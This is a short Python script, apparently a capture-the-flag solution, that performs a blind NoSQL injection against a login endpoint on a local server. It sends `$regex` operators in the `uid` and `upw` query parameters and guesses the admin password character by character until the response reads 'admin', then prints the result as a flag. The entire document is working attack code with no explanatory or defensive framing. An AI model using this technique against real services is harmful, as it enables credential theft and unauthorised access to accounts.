#!/usr/bin/python3

import requests, string

HOST =  'http://127.0.0.1:8000'
ALPHANUMRIC = string.digits + string.ascii_letters
# Add more string.punctuation if necessary.
SUCCESS_TEXT = 'admin'
FLAG = ''
lengthOfResult = 32

for i in range(lengthOfResult):
    for c in ALPHANUMRIC:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad..n&upw[$regex]=D.{{{FLAG}{c}')
        if response.text == SUCCESS_TEXT:
            FLAG += c
            break
    print(f'DH{{{FLAG}}}')
